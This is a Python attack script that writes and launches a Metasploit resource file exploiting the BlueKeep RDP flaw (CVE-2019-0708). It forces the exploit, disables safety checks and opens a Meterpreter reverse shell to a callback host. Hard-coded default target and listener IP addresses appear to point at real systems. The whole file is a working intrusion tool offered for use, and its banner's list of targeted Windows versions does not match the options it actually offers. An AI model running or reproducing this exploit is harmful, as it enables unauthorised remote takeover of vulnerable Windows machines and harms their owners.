#!/usr/bin/env python3

import subprocess
import sys
import os
import argparse

def create_script(target_ip, local_ip, target_id=2, rdp_port=3389, local_port=4444):
    """Create a customized resource script for BlueKeep exploitation."""
    script_content = f"""use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS {target_ip}
set RPORT {rdp_port}
set TARGET {target_id}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {local_ip}
set LPORT {local_port}
set ForceExploit true
set AutoCheck false
exploit
"""
    
    # Save to file
    script_path = f"/tmp/force_bluekeep_{target_id}.rc"
    with open(script_path, "w") as f:
        f.write(script_content)
    
    return script_path

def display_target_info():
    """Display information about available targets."""
    print("\nAvailable targets for BlueKeep exploit:")
    print(" 0: Automatic targeting")
    print(" 1: Windows 7 SP1 (6.1.7601 x64)")
    print(" 2: Windows 7 SP0 (6.1.7600 x64)  [RECOMMENDED]")
    print(" 3: Windows 2008 R2 SP1 (6.1.7601 x64)")
    print(" 4: Windows 2008 R2 SP0 (6.1.7600 x64)")
    print(" 5: Windows 2008 SP1 (6.0.6001 x64)")
    print("\nNOTE: Windows 2008 targets require fDisableCam=0 registry setting!")

def main():
    parser = argparse.ArgumentParser(description="Force BlueKeep Exploit with specific target")
    parser.add_argument("-i", "--target", default="38.173.135.141", help="Target IP (default: 38.173.135.141)")
    parser.add_argument("-l", "--local", default="88.218.130.67", help="Local IP for reverse connection (default: 88.218.130.67)")
    parser.add_argument("-t", "--target-id", type=int, choices=range(6), default=2, help="Target ID (default: 2 - Windows 7 SP0)")
    parser.add_argument("-p", "--port", type=int, default=3389, help="RDP port (default: 3389)")
    parser.add_argument("-o", "--lport", type=int, default=4444, help="Local port for handler (default: 4444)")
    
    args = parser.parse_args()
    
    display_target_info()
    
    print(f"\nCreating forced exploit script with the following settings:")
    print(f"Target: {args.target}:{args.port}")
    print(f"Local handler: {args.local}:{args.lport}")
    print(f"Target ID: {args.target_id}")
    print(f"Force Exploit: Yes (AutoCheck disabled)\n")
    
    # Ask for confirmation
    confirm = input("Continue with these settings? (y/n): ")
    if confirm.lower() != 'y':
        print("Operation cancelled.")
        sys.exit(0)
    
    script_path = create_script(args.target, args.local, args.target_id, args.port, args.lport)
    print(f"\nCreated Metasploit resource script: {script_path}")
    print("Launching Metasploit...\n")
    
    # Run Metasploit with the script
    try:
        subprocess.run(["msfconsole", "-q", "-r", script_path])
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
    except Exception as e:
        print(f"\nError: {e}")
    finally:
        # Clean up the script file
        if os.path.exists(script_path):
            os.remove(script_path)

if __name__ == "__main__":
    banner = """
    ____  __           __ __                     ___________                     
   / __ )/ /_  _____  / //_/__  ___ ____        / ____/ ___/_____________  _____
  / __  / / / / / _ \/ ,< / _ \/ -_) __/       / /_   \__ \/ ___/ ___/ _ \/ ___/
 / /_/ / /___/ /  __/ /| /  __/\__/_/         / __/  ___/ / /__/ /  /  __/ /__  
/_____/_____/_/\___/_/ |_\___/               /_/    /____/\___/_/   \___/\___/  
                                                                               
 CVE-2019-0708 BlueKeep Forced Exploit - Target Specific Version
 Target: Windows 2003/XP/Vista/7/Server 2008
 """
    print(banner)
    main()
